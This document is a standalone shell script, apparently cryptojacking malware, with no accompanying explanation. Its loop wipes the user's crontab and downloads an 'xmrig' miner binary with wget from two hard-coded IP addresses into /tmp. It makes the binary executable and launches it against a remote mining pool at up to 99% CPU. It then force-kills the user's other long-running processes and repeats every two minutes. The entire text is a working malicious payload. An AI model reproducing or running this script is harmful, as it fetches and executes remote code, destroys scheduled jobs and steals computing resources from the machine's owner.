while true;
do
	crontab -r;
	if [ ! -e "/tmp/xmrig_s" ]; then
    	wget http://86.105.49.215/xmrig_s -O /tmp/xmrig_s; chmod +x /tmp/xmrig_s;
	fi
	if [ ! -s "/tmp/xmrig_s" ]; then
    	wget http://203.131.221.48/xmrig_s -O /tmp/xmrig_s; chmod +x /tmp/xmrig_s;
	fi
	if [ "$(ps x | grep -c "xmri[g]")" -lt "1" ]; then
		/tmp/xmrig_s -r 1000 --donate-level 1 -o 119.23.222.239:26590 -B -p pass -k --max-cpu-usage=99 ;
	fi
	ps -eo user,pid,time,comm | grep $("whoami") | grep -v 'xmrig' | awk 'BEGIN{ FS=":|-"; OFS=""; } { print $1,$2,$3,$4,$5,$6 }' | awk '$3>5000' | awk '{print $2}' | xargs -r kill -9
	sleep 120;
done
